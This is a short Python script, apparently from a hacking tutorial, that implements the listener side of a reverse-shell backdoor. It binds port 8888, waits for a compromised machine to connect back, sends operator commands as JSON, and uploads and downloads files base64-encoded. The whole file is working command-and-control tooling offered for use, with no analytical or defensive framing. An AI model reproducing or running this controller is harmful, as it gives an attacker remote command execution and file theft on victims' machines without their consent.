#!C:\Users\TheDarthStar\AppData\Local\Programs\Python\Python37-32\python.exe
import socket,json,base64

class Listener:
	def __init__(self,ip="",port=8888):
		self.TCP_SOCK=""
		self.TCP_SOCK =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.TCP_SOCK.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)		
		self.TCP_SOCK.bind((ip,port))
	
	def start(self):
		self.TCP_SOCK.listen(0)	 
		print("[+] waiting for incoming connection")
		connection,adrress=self.TCP_SOCK.accept()
		print("[+] Got a connection from "+str(adrress))
		self.connection(connection,adrress)
	def reciever(self,connection):
		recieve = ""
		while 1:
			recieve += connection.recv(1024).decode()
			try:
				return json.loads(recieve)
			except ValueError:
				continue
	def sender(self,command,connection):
		connection.send(json.dumps(command).encode())
	def file_read(self,file_name):
		with open(file_name,"rb") as files:
			return base64.b64encode(files.read()).decode()		
	def file_write(self,path,file_content):
		with open(path,"wb") as files:
			print("i'll write a file")
			files.write(base64.b64decode(file_content.encode()))
			return "[+] "+path+" downloaded!"
	def connection(self,connection,adrress):
		command = input(">> ")
		# print(command)
		command=command.split(" ")
		# print(command)
		save_this_results = False
		read_a_file = False
		# try:
		if command[0]=="upload":
			command.append(self.file_read(command[1]))
		elif command[0]=="download":
			save_this_results = True
		self.sender(command,connection)
		if command[0]=='exit':
			self.TCP_SOCK.close()
			exit()
		# except Exception as e:
			# print("[-]client machine down use listenerOff = /lo option error found \n",e)# connectionOff = /co or
			# self.start()
		responce=self.reciever(connection)
		if save_this_results:
			print(self.file_write(command[1],responce))
		else:
			print(responce)
		self.connection(connection,adrress)

var = Listener()
var.start()